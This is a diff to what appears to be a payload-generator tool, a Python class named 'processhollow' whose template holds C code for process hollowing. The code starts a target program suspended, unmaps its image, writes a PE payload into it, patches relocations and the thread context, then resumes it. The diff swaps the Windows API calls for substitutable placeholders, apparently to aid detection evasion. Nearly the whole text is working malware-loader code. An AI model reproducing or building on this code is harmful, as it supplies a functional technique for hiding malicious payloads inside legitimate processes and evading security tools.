@@ -22,12 +22,10 @@ class processhollow:
         return []
 
     def apicalls(self) -> list[str]:
-        return []
+        return ['NtUnmapViewOfSection', 'VirtualAllocEx', 'CreateProcessA', 'GetThreadContext', 'SetThreadContext', 'ReadProcessMemory', 'WriteProcessMemory', 'ResumeThread']
 
     def codeblocks(self) -> str:
         return """
-typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(HANDLE ProcessHandle, PVOID BaseAddress);
-
 typedef struct RELOCATION_BLOCK {
 	DWORD PageAddress;
 	DWORD BlockSize;
@@ -50,16 +48,14 @@ typedef struct RELOCATION_ENTRY {
     }}; 
     PROCESS_INFORMATION pi; 
 
-    printf("[+] Creating Notepad.exe as Suspended Process.\\n");
-	CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	{CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
-    
 	// Get All The Register Values
 	printf("[+] Getting Current Context.\\n");
 	CONTEXT threadContext;
     ZeroMemory(&threadContext, sizeof(CONTEXT));
 	threadContext.ContextFlags = CONTEXT_FULL;
-	if (!GetThreadContext(pi.hThread, &threadContext)) {{
+	if (!{GetThreadContext}(pi.hThread, &threadContext)) {{
 		printf("[-] Error getting context\\n");
 		return 0;
 	}}
@@ -67,19 +63,12 @@ typedef struct RELOCATION_ENTRY {
 
 	// Get The Base Address Of The Suspended Process
 	PVOID baseAddress;
-
-            printf("test");
     
-    ReadProcessMemory(pi.hProcess, (PVOID)(threadContext.Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
-
-        printf("test");
+    {ReadProcessMemory}(pi.hProcess, (PVOID)(threadContext.Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
 
     // Getting The Address Of NtUnmapViewOfSection And Unmapping All Sections
 	printf("[+] Unmapping the Memory Section of Target Process.\\n");
-	HMODULE ntdllHandle = GetModuleHandleA("ntdll");
-	FARPROC ntUnmapViewOfSectionProc = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
-	_NtUnmapViewOfSectionFunc ntUnmapViewOfSection = (_NtUnmapViewOfSectionFunc)ntUnmapViewOfSectionProc;
-	if (ntUnmapViewOfSection(pi.hProcess, baseAddress)) {{
+	if ({NtUnmapViewOfSection}(pi.hProcess, baseAddress)) {{
 		printf("[-] Error to unmap the Section\\n");
 		return 0;
 	}}
@@ -90,7 +79,7 @@ typedef struct RELOCATION_ENTRY {
 	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)shellcode + dosHeader->e_lfanew);
 
 	// Allocating Memory in Suspended Process
-	PVOID allocatedMemory = VirtualAllocEx(pi.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
+	PVOID allocatedMemory = {VirtualAllocEx}(pi.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
 
 	// Calculate The Offset Of the 64-bits Process Base Address From The File's Base Address
 	DWORD64 baseOffset = (DWORD64)baseAddress - ntHeaders->OptionalHeader.ImageBase;
@@ -100,7 +89,7 @@ typedef struct RELOCATION_ENTRY {
 	ntHeaders->OptionalHeader.ImageBase = (DWORD64)baseAddress;
 
 	// Write The File's Headers To The Allocated Memory In The Suspended Process
-	if (!WriteProcessMemory(pi.hProcess, baseAddress, shellcode, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {{
+	if (!{WriteProcessMemory}(pi.hProcess, baseAddress, shellcode, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {{
 		printf("Failed to write Headers\\n");
 		return 0;
 	}}
@@ -115,7 +104,7 @@ typedef struct RELOCATION_ENTRY {
 		printf("0x%p -- Writing Section: %s\\n", (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress, sectionHeader->Name);
 
 		// Write The Section From The File Into The Allocated Memory
-		if (!WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)shellcode + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {{
+		if (!{WriteProcessMemory}(pi.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)shellcode + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {{
 			printf("Error Writing Section: %s. At: 0x%p\\n", sectionHeader->Name, (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress);
 		}}
 	}}
@@ -173,12 +162,12 @@ typedef struct RELOCATION_ENTRY {
 
 					// Read The Value At That Address
 					DWORD64 entryAddress = 0;
-					ReadProcessMemory(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
+					{ReadProcessMemory}(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
 					printf("0x%p --> 0x%p | At:0x%p\\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD64)baseAddress + fieldAddress));
 
 					// Add The Correct Offset To That Address And Write It
 					entryAddress += baseOffset;
-					if (!WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {{
+					if (!{WriteProcessMemory}(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {{
 						printf("Error Writing Entry.\\n");
 					}}
 				}}
@@ -187,20 +176,20 @@ typedef struct RELOCATION_ENTRY {
 	}}
 
 	// Write The New Image Base Address
-	WriteProcessMemory(pi.hProcess, (PVOID)(threadContext.Rdx + (sizeof(SIZE_T) * 2)), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+	{WriteProcessMemory}(pi.hProcess, (PVOID)(threadContext.Rdx + (sizeof(SIZE_T) * 2)), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
 
 	// Write The New Entry Point
 	DWORD64 entryPoint = (DWORD64)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
 	threadContext.Rcx = entryPoint;
 
 	printf("\\n[+] Setting the Thread Context.\\n");
-	if (!SetThreadContext(pi.hThread, &threadContext)) {{
+	if (!{SetThreadContext}(pi.hThread, &threadContext)) {{
 		printf("Error setting context\\n");
 		return 0;
 	}}
 
 	printf("[+] Resuming Thread.\\n");
-	if (!ResumeThread(pi.hThread)) {{
+	if (!{ResumeThread}(pi.hThread)) {{
 		printf("[-]Error resuming thread\\n");
 		return 0;
 	}}
